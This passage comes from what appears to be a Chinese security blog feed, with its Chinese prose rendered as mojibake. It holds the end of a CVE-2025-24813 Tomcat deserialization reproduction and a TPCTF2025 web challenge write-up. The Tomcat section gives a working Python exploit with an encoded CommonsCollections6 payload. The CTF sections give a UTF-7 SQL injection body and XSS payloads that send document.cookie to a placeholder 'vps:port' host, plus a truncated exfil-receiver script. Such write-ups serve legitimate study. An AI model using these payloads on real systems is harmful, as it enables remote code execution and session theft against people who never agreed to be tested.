class="hljs-number">1200</span><br></code></pre></td></tr></table></figure><p>ç„¶åPUTä¸Šä¼ SESSIONï¼Œä¹‹åGETè®¿é—®</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Cookie:JSESSIONID=.xxx<br></code></pre></td></tr></table></figure><p>å°±èƒ½åœ¨<code>FileStore.load()</code>è§¦å‘ååºåˆ—åŒ–ã€‚</p><p>ä¸ºäº†æ–¹ä¾¿ä¼ å‚ï¼Œå¹²è„†å†™ä¸ªpythonè„šæœ¬æ¥å®ç°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&#x27;http://localhost:8082&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">put</span>(<span class="hljs-params">url, data, headers, timeout=<span class="hljs-number">10</span>, verify=<span class="hljs-literal">True</span></span>):<br>    response = requests.put(url=url, data=data, headers=headers, timeout=timeout, verify=verify)<br>    <span class="hljs-keyword">return</span> response<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">url, headers, timeout=<span class="hljs-number">10</span>, verify=<span class="hljs-literal">True</span></span>):<br>    response = requests.get(url=url, headers=headers, timeout=timeout, verify=verify)<br>    <span class="hljs-keyword">return</span> response<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># CC6/calc</span><br>    origin_payload = <span class="hljs-string">b&#x27;rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAAEdGVzdHNyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABHNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWVwdAAJZ2V0TWV0aG9kdXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAcc3EAfgATdXEAfgAYAAAAAnEAfgAScHQABmludm9rZXVxAH4AHAAAAAJ2cgAQamF2YS5sYW5nLk9iamVjdAAAAAAAAAAAAAAAeHB2cQB+ABhzcQB+ABN1cQB+ABgAAAABdAAIY2FsYy5leGV0AARleGVjdXEAfgAcAAAAAXEAfgAfc3EAfgAAP0AAAAAAAAx3CAAAABAAAAAAeHh0AAN4eHh4&#x27;</span><br><br>    <span class="hljs-comment">#tomcatå†…å­˜é©¬</span><br>    <span class="hljs-comment"># origin_payload = b&#x27;xxx&#x27;</span><br>    payload = base64.b64decode(origin_payload)<br>    put_headers = &#123;<br>        <span class="hljs-string">&#x27;Content-Range&#x27;</span>: <span class="hljs-string">f&#x27;bytes 0-<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(payload)+<span class="hljs-number">1</span>&#125;</span>/1000&#x27;</span><br>    &#125;<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(payload)+<span class="hljs-number">1</span>)<br>    put_response = put(url+<span class="hljs-string">&#x27;/eddie/session&#x27;</span>, payload, put_headers)<br>    <span class="hljs-keyword">if</span>(put_response.status_code == <span class="hljs-number">409</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;PUT SUCCESSFUL!&quot;</span>)<br><br>    time.sleep(<span class="hljs-number">0.1</span>)<br><br>    get_headers = &#123;<br>        <span class="hljs-string">&quot;JSESSIONID&quot;</span> : <span class="hljs-string">&quot;.eddie&quot;</span><br>    &#125;<br>    get_response = get(url, get_headers)<br><br>    <span class="hljs-keyword">if</span>(get_response):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ATTACK SUCCESSFUL!&quot;</span>)<br><br></code></pre></td></tr></table></figure><p><img src="/2025/03/15/Tomcat-RCE%E5%A4%8D%E7%8E%B0/image-20250315173816484.png" alt="image-20250315173816484"></p><p>ä½†æ˜¯è¿™ä¸ªæœ‰ç‚¹ä¸ç¨³å®šï¼Œä¸€æ¬¡ä¸ä¸€å®šèƒ½é€šã€‚</p><p>å¯èƒ½å°±æ˜¯é‚£ä¸ªtimeoutçš„é—®é¢˜ï¼Œå¤šæ‰“å‡ æ¬¡åº”è¯¥å°±æ²¡å•¥é—®é¢˜äº†ã€‚</p><p>å†…å­˜é©¬æˆ‘è¯•äº†ä¸‹ï¼Œæ‰“çš„ä¸ç†æƒ³ï¼Œæ„Ÿè§‰è§¦å‘æœ‰ç‚¹é—®é¢˜ï¼Œæ‰€ä»¥æš‚æ—¶å°±ç”¨è¿™ä¸ªå‡ºç½‘æ‰“æ³•é¡¶ä¸€ä¸‹å§ã€‚</p><p>è·Ÿé“¾å­å¯ä»¥çœ‹å¤§Bå“¥çš„ï¼Œå†™çš„å¾ˆè¯¦ç»†ï¼š</p><p>[CVE-2025-24813 Tomcat Session ååºåˆ—åŒ–ç»„åˆæ‹³ - Boogiepop Doesnâ€™t Laugh](<a href="https://boogipop.com/2025/03/13/CVE-2025-24813">https://boogipop.com/2025/03/13/CVE-2025-24813</a> Tomcat Session ååºåˆ—åŒ–ç»„åˆæ‹³&#x2F;)</p><p>å‚è€ƒï¼š</p><p><a href="https://mp.weixin.qq.com/s/z6BY_xC4YR4PYHT8LI0u_w">CVE-2025-24813â€”â€”tomcatæ–‡ä»¶ä¸Šä¼ åˆ°ååºåˆ—åŒ–</a></p><p><a href="https://forum.butian.net/article/674">å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-å…¨ç½‘é¦–å‘ï¼CVE-2025-24813 Tomcat æœ€æ–° RCE åˆ†æå¤ç°</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>CVEå¤ç°</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TPCTF2025-WEB-Learning</title>
    <link href="/2025/03/12/TPCTF2025-WEB-Learning/"/>
    <url>/2025/03/12/TPCTF2025-WEB-Learning/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æˆ‘å‹’ä¸ªXSSå¤§èµ›ã€‚ã€‚</p><p>æœ€å–œæ¬¢çš„javaæ²¡æœ‰å‡ºç°åœ¨webä¸­ï¼Œåè€Œåœ¨miscä¸­å—ï¼Œå“ˆå‰tpctfä½ è¿™å®¶ä¼™ã€‚</p><h2 id="thumbor-1"><a href="#thumbor-1" class="headerlink" title="thumbor 1"></a>thumbor 1</h2><p>é™„ä»¶ç»™çš„æ˜¯thumborçš„æ’ä»¶ç¯å¢ƒï¼Œhintè¯´æ²¡æœ‰0dayã€‚</p><p>é‚£åº”è¯¥å°±ä¸æ˜¯thumboræœ¬èº«çš„é—®é¢˜ï¼Œå…¶å®ä¹Ÿæœ‰ç‚¹å…³ç³»ï¼Œå°±æ˜¯å¯ä»¥urlè®¿é—®å›¾ç‰‡ï¼Œè¿™ä¸ªåœ¨å®˜æ–¹securityæ–‡æ¡£å°±èƒ½çœ‹åˆ°ï¼š<a href="https://thumbor.readthedocs.io/en/latest/security.html">Security â€” Thumbor 7.7.4 documentation</a></p><p>ä½†è¿™ä¸ªé¢˜å…¶å®æ˜¯ä¾èµ–çš„æ¼æ´emmmmmï¼Œä¸€å¼€å§‹çœŸä»¥ä¸ºæ˜¯æŒ–0dayã€‚ã€‚ã€‚</p><p>thumbor1çš„ä¾èµ–ç»„ä»¶æœ‰ä¸€ä¸ªImageMagickï¼Œæ˜¯ä¸€ä¸ªå…è´¹çš„å¼€æºè½¯ä»¶å¥—ä»¶ï¼Œç”¨äºæ˜¾ç¤ºã€è½¬æ¢å’Œç¼–è¾‘å…‰æ …å›¾åƒå’Œå‘é‡å›¾åƒæ–‡ä»¶ã€‚å®ƒæ”¯æŒ200å¤šç§å›¾åƒæ–‡ä»¶æ ¼å¼ï¼Œå¹¶å¯æ‰§è¡Œå„ç§å›¾åƒå¤„ç†æ“ä½œã€‚</p><p>è¿™é‡Œçš„æ¼æ´å³ä¸º<code>CVE-2022-44268</code>ï¼ŒImageMagickçš„ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ã€‚</p><p><a href="https://www.metabaseq.com/threat/imagemagick-zero-days/">https://www.metabaseq.com/threat/imagemagick-zero-days/</a><br><a href="https://github.com/voidz0r/CVE-2022-44268?tab=readme-ov-file">https://github.com/voidz0r/CVE-2022-44268?tab=readme-ov-file</a></p><p>æˆ‘ä»¬å¯ä»¥è®©é¶æœºè®¿é—®æŒ‚åœ¨è‡ªå·±vpsä¸Šç²¾å¿ƒæ„é€ å¥½çš„pngï¼Œè¿œç¨‹è§£æå°±ä¼šæŠŠå¯¹åº”çš„æ–‡ä»¶é™„åŠ åœ¨å›¾ç‰‡é‡Œï¼Œå¤ç°CVEå°±å®Œäº†ï¼š</p><p><img src="/2025/03/12/TPCTF2025-WEB-Learning/image-20250312171249419.png" alt="image-20250312171249419"></p><p>flagä¹Ÿä¸€æ ·çš„ï¼Œä½æƒé™å¯è¯»ï¼š</p><p><img src="/2025/03/12/TPCTF2025-WEB-Learning/image-20250312171325491.png" alt="image-20250312171325491"></p><p><img src="/2025/03/12/TPCTF2025-WEB-Learning/image-20250312171335377.png" alt="image-20250312171335377"></p><h2 id="thumbor-2"><a href="#thumbor-2" class="headerlink" title="thumbor 2"></a>thumbor 2</h2><p>è¿˜æ˜¯ä¸€æ ·çš„ç»„ä»¶æ¼æ´ï¼Œä½†æ˜¯å¯ä»¥å‘ç°dockerfileé‡Œé‡è£…äº†æœ€æ–°çš„ImageMagickï¼Œæ‰€ä»¥éœ€è¦æ‰¾æ–°çš„ç»„ä»¶ã€‚</p><p>è¿™é‡Œé˜Ÿé‡Œnamaå’Œèµµå“¥æ‰¾äº†å¾ˆå¤šï¼Œè¯•äº†XXEç­‰ç­‰ï¼Œä»¥åŠghostscript 9.5çš„RCEï¼Œå‡å¤±è´¥ã€‚ä½†æ˜¯å¾ˆå¥‡æ€ªçš„æ˜¯ç‰ˆæœ¬ç”¨çš„gsç¡®å®æ˜¯9.5ï¼Œä¸ºä»€ä¹ˆæ‰“ä¸é€šå‘¢ã€‚ã€‚ã€‚</p><p><img src="/2025/03/12/TPCTF2025-WEB-Learning/761c7091405f5f466125cac7e6605f27.png" alt="img"></p><p>æœ€ç»ˆé”å®šæ¼æ´ç»„ä»¶librsvgï¼Œ<code>CVE-2023-38633</code>ï¼šlibrsvg 2.56.3 ä¹‹å‰ç‰ˆæœ¬ä¸­ URL è§£ç å™¨çš„ç›®å½•éå†é—®é¢˜ï¼Œå¯ä»¥è¢«æœ¬åœ°æˆ–è¿œç¨‹æ”»å‡»è€…ç”¨æ¥æ³„éœ²æ–‡ä»¶ï¼š</p><p><a href="https://blog.csdn.net/HMX404/article/details/137231580">https://blog.csdn.net/HMX404/article/details/137231580</a></p><p>åŒæ ·çš„æ‰“æ³•ï¼Œå¯ä»¥è·å¾—æ¼æ´è§£æåçš„åŒ…å«flagçš„å›¾ç‰‡ï¼Œç›´æ¥è®¿é—®å°±èƒ½çœ‹åˆ°äº†ï¼š</p><p><img src="/2025/03/12/TPCTF2025-WEB-Learning/image-20250312171818815.png" alt="image-20250312171818815"></p><p>è¿™é‡Œçœ‹ä¸åˆ°å®Œæ•´çš„ç›´æ¥è°ƒå®½é«˜å°±è¡Œäº†ã€‚flagä¹Ÿæ˜¯ä½æƒé™å¯è¯»ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -o output.jpg -H <span class="hljs-string">&quot;Host: 1.95.57.127:3602&quot;</span> -H <span class="hljs-string">&quot;Accept-Encoding: gzip, deflate&quot;</span> -H <span class="hljs-string">&quot;Upgrade-Insecure-Requests: 1&quot;</span> -H <span class="hljs-string">&quot;Priority: u=0, i&quot;</span> -H <span class="hljs-string">&quot;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0&quot;</span> -H <span class="hljs-string">&quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span> -H <span class="hljs-string">&quot;Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span> <span class="hljs-string">&quot;http://1.95.57.127:3602/thumbor/unsafe/smart/http%3A%2F%2Fvps%3A1234%2F1.svg&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/03/12/TPCTF2025-WEB-Learning/image-20250312171851877.png" alt="image-20250312171851877"></p><h2 id="supersqli"><a href="#supersqli" class="headerlink" title="supersqli"></a>supersqli</h2><p>èµµå“¥å¤ªç‹ äº†ï¼Œç›´æ¥æ‹¿ä¸‹ä¸€è¡€ã€‚</p><p>è®ºæ–‡é¢˜ï¼ŒæŒ‰ç…§å®ƒçš„æ–¹æ³•æ‰“å¤ç°å°±è¡Œäº†ï¼š</p><p><a href="https://www.jianjunchen.com/p/wafmanis.sq24.pdf">Jianjun Chen | Associate Professor | Tsinghua University</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Break the Wall from Bottom: Automated Discovery of Protocol-Level Evasion Vulnerabilities <span class="hljs-keyword">in</span> Web Application Firewalls<br>2024 IEEE Symposium on Security and Privacy<br>Qi Wang, Jianjun Chen, Zheyu Jiang, Run Guo, Ximeng Liu, Chao Zhang, Haixin Duan<br></code></pre></td></tr></table></figure><p>å…¶å®ä¹Ÿæ˜¯é˜Ÿé‡Œå»æ¸…åçš„ekiä½¬çš„è®ºæ–‡ï¼ŒtqlğŸ˜­</p><p>é«˜æ‰‹ï¼ï¼ï¼ï¼ï¼</p><p>ç›´æ¥å¾€&#x2F;flagå‘POSTï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">+AHUAcwBlAHIAbgBhAG0AZQ-=+AGEAZABtAGkAbg-&amp;+AHAAYQBzAHMAdwBvAHIAZA-=+ACcALwAqACoALwB1AG4AaQBvAG4ALwAqACoALwBTAEUATABFAEMAVAAvACoAKgAvADEALAAyACwAUgBFAFAATABBAEMARQAoAFIARQBQAEwAQQBDAEUAKAAnACIALwAqACoALwB1AG4AaQBvAG4ALwAqACoALwBTAEUATABFAEMAVAAvACoAKgAvADEALAAyACwAUgBFAFAATABBAEMARQAoAFIARQBQAEwAQQBDAEUAKAAiAC4AIgAsAEMASABBAFIAKAAzADQAKQAsAEMASABBAFIAKAAzADkAKQApACwAQwBIAEEAUgAoADQANgApACwAIgAuACIAKQAvACoAKgAvAEEAUwAvACoAKgAvAGMAaAAzAG4AcwAxAHIALQAtACcALABDAEgAQQBSACgAMwA0ACkALABDAEgAQQBSACgAMwA5ACkAKQAsAEMASABBAFIAKAA0ADYAKQAsACcAIgAvACoAKgAvAHUAbgBpAG8AbgAvACoAKgAvAFMARQBMAEUAQwBUAC8AKgAqAC8AMQAsADIALABSAEUAUABMAEEAQwBFACgAUgBFAFAATABBAEMARQAoACIALgAiACwAQwBIAEEAUgAoADMANAApACwAQwBIAEEAUgAoADMAOQApACkALABDAEgAQQBSACgANAA2ACkALAAiAC4AIgApAC8AKgAqAC8AQQBTAC8AKgAqAC8AYwBoADMAbgBzADEAcgAtAC0AJwApAC8AKgAqAC8AQQBTAC8AKgAqAC8AYwBoADMAbgBzADEAcgAtAC0-<br></code></pre></td></tr></table></figure><p><img src="/2025/03/12/TPCTF2025-WEB-Learning/image-20250312173728078.png" alt="image-20250312173728078"></p><p>å½“ç„¶ä¹Ÿæœ‰çœŸå»æ³¨çš„ï¼Œç”¨quineæ³¨å…¥ï¼Œå…¶ä»–é˜Ÿçš„wpå¯ä»¥åº·ï¼š</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzkzMzYxNjI5Mw==&mid=2247484898&idx=1&sn=dc43b70afd69797c9e38064cf885aca8&chksm=c38c579bc6a06095bcf013f14ab0283825e8697521db2ccb994146d2c8734fc8b42a70fafc73&mpshare=1&scene=23&srcid=0311SjwfgvA26hSXXa38Dg7s&sharer_shareinfo=39bc415b40460825aa4be31f9fa60d83&sharer_shareinfo_first=39bc415b40460825aa4be31f9fa60d83#rd">TPCTF 2025 Writeup by 0xFFF</a></p><h2 id="layoutä¸‰ä»¶å¥—"><a href="#layoutä¸‰ä»¶å¥—" class="headerlink" title="layoutä¸‰ä»¶å¥—"></a>layoutä¸‰ä»¶å¥—</h2><p>åŸé¢˜æ‰“æ³•ã€‚</p><p>è¯·çœ‹VCRï¼š</p><p><a href="https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations">Exploring the DOMPurify library: Hunting for Misconfigurations (2&#x2F;2) | mizu.re</a></p><p><a href="https://github.com/Sudistark/CTF-Writeups/blob/main/Flatt-Security-XSS-Challenge/solutions.md">https://github.com/Sudistark/CTF-Writeups/blob/main/Flatt-Security-XSS-Challenge/solutions.md</a></p><h3 id="baby-layout"><a href="#baby-layout" class="headerlink" title="baby layout"></a>baby layout</h3><p>æºç å¾ˆç®€å•ï¼ŒXSSè¯»åˆ°adminçš„cookieå°±æ˜¯flagã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">layout</span>:   <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&#123;&#123;content&#125;&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span></span>  <br><span class="hljs-attr">content</span>:  test<span class="hljs-string">&quot; onload=location.href=&quot;</span><span class="hljs-attr">http</span>:<span class="hljs-comment">//vps:port?flag=&quot;+document.cookie src=&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/03/12/TPCTF2025-WEB-Learning/image-20250312175306344.png" alt="image-20250312175306344"></p><h3 id="safe-layout"><a href="#safe-layout" class="headerlink" title="safe layout"></a>safe layout</h3><p>åœ¨åŸæ¥çš„åŸºç¡€ä¸Šè¿‡æ»¤äº†æ‰€æœ‰htmlå±æ€§ã€‚åŠ äº†ä¸ª</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">ALLOWED_ATTR</span>: []<br></code></pre></td></tr></table></figure><p>data-* å’Œ aria-* ç±»çš„å±æ€§ä¸ä¼šè¢«è¿‡æ»¤ï¼ŒæŒ‰ç…§æ–‡ç« æ”¹æ”¹å°±è¡Œï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">layout</span>:   <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">data-type</span>=<span class="hljs-string">&quot;&#123;&#123;content&#125;&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span></span><br><span class="hljs-attr">content</span>:  test<span class="hljs-string">&quot; onload=location.href=&quot;</span><span class="hljs-attr">http</span>:<span class="hljs-comment">//vps:port?flag=&quot;+document.cookie src=&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/03/12/TPCTF2025-WEB-Learning/image-20250312175631770.png" alt="image-20250312175631770"></p><h3 id="safe-layout-revenge"><a href="#safe-layout-revenge" class="headerlink" title="safe layout revenge"></a>safe layout revenge</h3><p>é™¤äº†å¯¹attrè¿›è¡Œè¿‡æ»¤ï¼Œariaå’Œdataä¸€å¹¶è¢«è¿‡æ»¤ï¼š</p><p><img src="/2025/03/12/TPCTF2025-WEB-Learning/image-20250312175818038.png" alt="image-20250312175818038"></p><p>å¯ä»¥é‡‡ç”¨styleç»•è¿‡ï¼ŒæŠŠxssçš„payloadæ„é€ å¥½åæŠŠscriptæ ‡ç­¾æ’å…¥contentï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">layout</span>: x&lt;style&gt;&lt;&#123;&#123;content&#125;&#125;/style&gt;&lt;&#123;&#123;content&#125;&#125;img src=x onerror=<span class="hljs-title function_">alert</span>()&gt;&lt;/style&gt;<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">x&lt;style&gt;&lt;&#123;&#123;content&#125;&#125;/style&gt;&lt;&#123;&#123;content&#125;&#125;img src=x onerror=<span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;http://vps:port?flag=&#x27;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)&gt;&lt;/style&gt;<br></code></pre></td></tr></table></figure><p>æäº¤å†…å®¹ä¸ºç©ºå³å¯ï¼š</p><p><img src="/2025/03/12/TPCTF2025-WEB-Learning/image-20250313004157671.png" alt="image-20250313004157671"></p><p>å®˜æ–¹ï¼š</p><p><img src="/2025/03/12/TPCTF2025-WEB-Learning/image-20250313004231645.png" alt="image-20250313004231645"></p><h2 id="Are-you-incognito"><a href="#Are-you-incognito" class="headerlink" title="Are you incognito?"></a>Are you incognito?</h2><p>å¥½åƒæ˜¯ustcå‘ç°çš„0dayï¼Ÿ</p><p><img src="/2025/03/12/TPCTF2025-WEB-Learning/image-20250312182551861.png" alt="image-20250312182551861"></p><p>åšæ³•æ¥è‡ª<a href="https://mp.weixin.qq.com/s/3N_0_rL38i5bg7iRjSd9qA">TPCTF2025 writeup by Mini-Venom</a>ï¼š</p><p>å¦‚æœä¸å­˜åœ¨<code>broswer.runtime.id</code>ï¼Œåˆ™<code>module.exports</code>å¯¼å‡º<code>window</code>çš„<code>browser</code>ã€‚</p><p>æ³¨æ„åˆ°<code>globalThis</code>æ˜¯<code>window</code>ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨<code>dom clobberate</code>æ±¡æŸ“<code>browser.runtime.id</code>ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (!(globalThis.<span class="hljs-property">browser</span> &amp;&amp; globalThis.<span class="hljs-property">browser</span>.<span class="hljs-property">runtime</span> &amp;&amp; globalThis.<span class="hljs-property">browser</span>.<span class="hljs-property">runtime</span>.<span class="hljs-property">id</span>)) &#123;<br><span class="hljs-comment">//...</span><br>&#125;<span class="hljs-keyword">else</span> &#123;<br>   <span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = globalThis.<span class="hljs-property">browser</span>;<br> &#125;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨iframeä¸‰å±‚æ±¡æŸ“ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;iframe name=<span class="hljs-string">&quot;browser&quot;</span> srcdoc=<span class="hljs-string">&#x27;</span><br><span class="hljs-string">   &lt;form id=&quot;runtime&quot;&gt;&lt;/form&gt;</span><br><span class="hljs-string">   &lt;form id=&quot;runtime&quot; name=&quot;id&quot;&gt;</span><br><span class="hljs-string">   &lt;/form&gt;</span><br><span class="hljs-string"> &lt;form id=&quot;extension&quot;&gt;&lt;/form&gt;</span><br><span class="hljs-string">   &lt;form id=&quot;extension&quot; name=&quot;inIncognitoContext&quot;&gt;</span><br><span class="hljs-string">   &lt;/form&gt;&#x27;</span>&gt;&lt;/iframe&gt;<br></code></pre></td></tr></table></figure><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">try</span>:<br>        file_path = os.path.join(os.path.dirname(__file__), <span class="hljs-string">&#x27;index.html&#x27;</span>)<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            data = f.read()<br>        <span class="hljs-keyword">return</span> data, <span class="hljs-number">200</span>, &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/html&#x27;</span>&#125;<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Internal Server Error&#x27;</span>, <span class="hljs-number">500</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/flag&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>():<br>    <span class="hljs-comment"># å¤„ ç†  POST è¯· æ±‚</span><br>    body = request.data.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    response = &#123;<br>        <span class="hljs-string">&#x27;status&#x27;</span>: <span class="hljs-string">&#x27;flag&#x27;</span>,<br>        <span class="hljs-string">&#x27;data&#x27;</span>: body<br>    &#125;<br>    <span class="hljs-built_in">print</span>(response)<br>    <span class="hljs-keyword">return</span> jsonify(response), <span 